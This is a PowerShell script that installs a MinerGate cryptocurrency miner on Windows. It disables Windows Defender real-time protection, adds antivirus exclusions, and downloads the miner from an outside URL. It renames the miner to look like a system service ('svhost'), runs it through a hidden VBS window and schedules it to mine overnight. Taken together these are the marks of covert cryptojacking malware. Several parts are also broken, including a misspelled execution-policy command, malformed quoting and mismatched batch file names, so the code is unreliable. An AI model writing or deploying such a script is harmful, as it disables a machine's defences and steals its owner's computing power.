#Run this command in Powershell Admin: Set-ExceptionPolicy Unrestricited
#Set for All

# Variables

$Arc = if ([System.IntPtr]::Size -eq 4) { "32-Bit" } else { "64-Bit" }
$url = "https://download.minergate.com/win-cli"
$output = "C:\Mining\download.zip" #"C:\ProgramData\Minergate\Download.zip"
$destination = "C:\Mining" #"C:\ProgramData\Minergate"
$start_time = Get-Date
$StartAction = New-ScheduledTaskAction -Execute 'C:\Mining\MinerGate-cli-4.04-win64\Startup.vbs' #'C:\ProgramData\Minergate\MinerGate-cli-4.04-win64\svhost.vbs'
$StartTrigger =  New-ScheduledTaskTrigger -Daily -At 7pm
$KillAction = New-ScheduledTaskAction -Execute 'C:\Mining\MinerGate-cli-4.04-win64\Kill.bat' #'C:\ProgramData\Minergate\MinerGate-cli-4.04-win64\Kill.bat'
$KillTrigger =  New-ScheduledTaskTrigger -Daily -At 7am
$CPUQuery = ((get-counter "\Processor(*)\% idle time").countersamples | select instancename).length -1
$CPU = $CPUQuery / 2 # Get CPUs and divides it by 2 to allow computer to play normal

# Check machine if 64-bit. If it isn't cancel the script: (I will include a 32-Bit ELSE command so it can run on either)

If ($Arc -eq "64-Bit") {

# Set Exceptions and Disable Windows Defender. 

Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -ExclusionPath ""C:\Mining", "C:\Mining\MinerGate-cli-4.04-win64"" #"C:\ProgramData"
Set-MpPreference -ExclusionProcess "Service.exe"

# Download latest Minergate Application and Extract it, Renaming Minergate-cli.exe to Service.exe

New-Item -Path "C:\Mining" -ItemType directory #"C:\ProgramData\Minergate"
Invoke-WebRequest -Uri $url -OutFile $output
Expand-Archive -path $output -destinationpath $destination
Rename-Item C:\Mining\MinerGate-cli-4.04-win64\Minergate-cli.exe Service.exe #C:\ProgramData\Minergate\MinerGate-cli-4.04-win64\Minergate-cli.exe svhost.exe

# Create .BAT File to Start Service

cd C:\Mining\MinerGate-cli-4.04-win64
"cd C:\Mining\MinerGate-cli-4.04-win64" | Out-File -encoding ascii js.bat -append
":miner" | Out-File -encoding ascii js.bat -append
"timeout /t 60" | Out-File -encoding ascii js.bat -append
"svhost -user minergateexmaple@protonmail.com -fcn+xmr $CPU" | Out-File -encoding ascii js.bat -append #Insert your own Minergate email here
"Goto :miner" | Out-File -encoding ascii js.bat -append

# Create .BAT File to Kill Service

"Taskkill /IM Service.exe /F" | Out-File -encoding ascii Kill.bat

# Create VBS Script

"Dim WShell" | Out-File -encoding ascii Startup.vbs
{Set WShell = CreateObject("WScript.Shell")} | Out-File -encoding ascii Startup.vbs -append
{WShell.Run "C:\Mining\MinerGate-cli-4.04-win64\BootDebug.bat", 0} | Out-File -encoding ascii Startup.vbs -append #
"Set WShell = Nothing" | Out-File -encoding ascii Startup.vbs -append

# Delete .ZIP File

Remove-Item $output

# Create Scheduled Start Task

Register-ScheduledTask -Action $StartAction -Trigger $StartTrigger -TaskName "Start_Minergate" -Description "Start Minergate"

# Create Scheduled Kill Task

Register-ScheduledTask -Action $KillAction -Trigger $KillTrigger -TaskName "Kill_Minergate" -Description "Kill Minergate"

.\Startup.vbs #Starts the Miner

}
